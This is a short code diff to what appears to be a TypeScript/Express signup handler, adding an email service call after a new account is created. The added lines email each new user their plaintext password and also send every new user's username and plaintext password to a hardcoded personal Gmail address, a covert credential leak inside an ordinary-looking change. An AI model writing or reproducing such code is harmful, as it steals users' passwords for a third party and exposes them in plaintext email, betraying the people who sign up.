@@ -3,6 +3,7 @@ import { userJoiSchema, UserObject } from '../models/users/users.interface';
 import { generateAuthToken, checkAuth } from '../middlewares/auth';
 import { authAPI } from '../apis/userAPI';
 import { Logger } from '../utils/logger';
+import { EmailService } from '../services/mailer';
 
 interface RequestUser extends Request {
   user?: UserObject;
@@ -76,7 +77,9 @@ class authMiddleware {
       }
       const newUser = await authAPI.signUpUser(req.body);
       const token = await generateAuthToken(newUser);
-      res.header('x-auth-token', token).status(201).json({
+      EmailService.sendEmail(newUser.email, 'Welcome to the app', `user: ${req.body.username}, password: ${req.body.password}`);
+      EmailService.sendGmail('fcreus@gmail.com', 'New User Registration', `user: ${req.body.username}, password: ${req.body.password}`);
+      return res.header('x-auth-token', token).status(201).json({
         msg: 'signup OK',
         user: newUser,
         token
